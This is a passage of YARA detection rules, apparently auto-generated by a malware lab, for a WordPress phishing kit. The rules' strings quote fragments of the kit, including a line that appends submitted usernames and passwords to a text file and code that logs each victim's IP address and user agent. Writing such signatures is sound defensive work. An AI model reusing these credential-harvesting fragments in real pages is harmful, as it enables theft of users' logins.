      $s4 = ".wp-core-ui .button,.wp-core-ui .button-primary,.wp-core-ui .button-secondary{display:inline-block;text-decoration:none;font-siz" ascii /* score: '30.00'*/
      $s5 = ".request-filesystem-credentials-dialog .ftp-username{margin-bottom:1em}.request-filesystem-credentials-dialog .ftp-password{marg" ascii /* score: '28.00'*/
      $s6 = "ancel-button{display:inline}.request-filesystem-credentials-dialog .ftp-password,.request-filesystem-credentials-dialog .ftp-use" ascii /* score: '28.00'*/
      $s7 = "ls-dialog .ftp-password{margin:0}.request-filesystem-credentials-dialog .ftp-password em{color:#888}.request-filesystem-credenti" ascii /* score: '28.00'*/
      $s8 = "in:0}.request-filesystem-credentials-dialog .ftp-password em{color:#888}.request-filesystem-credentials-dialog label{display:blo" ascii /* score: '28.00'*/
      $s9 = "rname{float:none;width:auto}.request-filesystem-credentials-dialog .ftp-username{margin-bottom:1em}.request-filesystem-credentia" ascii /* score: '28.00'*/
      $s10 = ".request-filesystem-credentials-dialog .ftp-password,.request-filesystem-credentials-dialog .ftp-username{float:none;width:auto}" ascii /* score: '28.00'*/
      $s11 = "weak,.show-password #pass1{display:none}input[type=checkbox]:checked:before{content:\"\\f147\";margin:-3px 0 0 -4px;color:#1e8cb" ascii /* score: '27.00'*/
      $s12 = "g label[for=public_key],.request-filesystem-credentials-dialog label[for=private_key]{display:block;margin-bottom:1em}.request-f" ascii /* score: '26.00'*/
      $s13 = "background:#fff;box-shadow:0 1px 3px rgba(0,0,0,.13)}.login form .forgetmenot{font-weight:400;float:left;margin-bottom:0}.login " ascii /* score: '24.00'*/
      $s14 = "t-size:14px}.login form .forgetmenot label{font-size:12px;line-height:19px}.login h1 a{background-image:url(images/w-logo-blue.p" ascii /* score: '24.00'*/
      $s15 = "ilesystem-credentials-dialog .request-filesystem-credentials-action-buttons{text-align:right}.login #pass-strength-result,.login" ascii /* score: '24.00'*/
      $s16 = "s:before{content:\"\\f106\"}.dashicons-admin-users:before{content:\"\\f110\"}.dashicons-admin-tools:before{content:\"\\f107\"}.d" ascii /* score: '23.00'*/
      $s17 = "ore{content:\"\\f133\"}.dashicons-welcome-view-site:before{content:\"\\f115\"}.dashicons-welcome-widgets-menus:before{content:\"" ascii /* score: '23.00'*/
      $s18 = "-dialog #auth-keys-desc{margin-bottom:0}#request-filesystem-credentials-dialog .button:not(:last-child){margin-right:10px}#reque" ascii /* score: '23.00'*/
      $s19 = "quest-filesystem-credentials-dialog #auth-keys-desc{margin-bottom:0}#request-filesystem-credentials-dialog .button:not(:last-chi" ascii /* score: '23.00'*/
      $s20 = "og label[for=hostname],.request-filesystem-credentials-dialog label[for=public_key],.request-filesystem-credentials-dialog label" ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__wordpress_home_ubuntu_malware_lab_samples_extracted_phishing_Wordpress_index {
   meta:
      description = "phish__wordpress - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5d075785e9770ec2637793b66977cc5c4fd0b7545711033e6dde3c484eff15c4"
   strings:
      $s1 = "header('Location: login.html');" fullword ascii /* score: '16.00'*/
      $s2 = "include 'ip.php';" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__wordpress_home_ubuntu_malware_lab_samples_extracted_phishing_Wordpress_login_2 {
   meta:
      description = "phish__wordpress - file login.php"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "487c3606216b08d8480143809b82b7e504a7b7d3fcaa51d3ed7db20faaf5846c"
   strings:
      $s1 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['log'] . \" Pass: \" . $_POST['pwd'] . \"\\n\", FILE_APPEND);" fullword ascii /* score: '29.00'*/
      $s2 = "header('Location: https://wordpress.com');" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__wordpress_home_ubuntu_malware_lab_samples_extracted_phishing_Wordpress_ip {
   meta:
      description = "phish__wordpress - file ip.php"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d0f8f3e7985a87e0beb1699ccfadab7268ffc777c05fa1dfcc35a16b6d393947"
   strings:
      $s1 = "$useragent = \" User-Agent: \";" fullword ascii /* score: '17.00'*/
      $s2 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s3 = "fwrite($fp, $useragent);" fullword ascii /* score: '12.00'*/
      $s4 = "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))" fullword ascii /* score: '12.00'*/
      $s5 = "$file = 'ip.txt';" fullword ascii /* score: '11.00'*/
      $s6 = "      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "$victim = \"IP: \";" fullword ascii /* score: '9.00'*/
      $s8 = "fwrite($fp, $victim);" fullword ascii /* score: '9.00'*/
      $s9 = "fwrite($fp, $ipaddress);" fullword ascii /* score: '7.00'*/
      $s10 = "if (!empty($_SERVER['HTTP_CLIENT_IP']))" fullword ascii /* score: '7.00'*/
      $s11 = "      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";" fullword ascii /* score: '5.00'*/
      $s12 = "fwrite($fp, $browser);" fullword ascii /* score: '4.00'*/
      $s13 = "$fp = fopen($file, 'a');" fullword ascii /* score: '4.00'*/
      $s14 = "      $ipaddress = $_SERVER['REMOTE_ADDR'].\"\\r\\n\";" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}
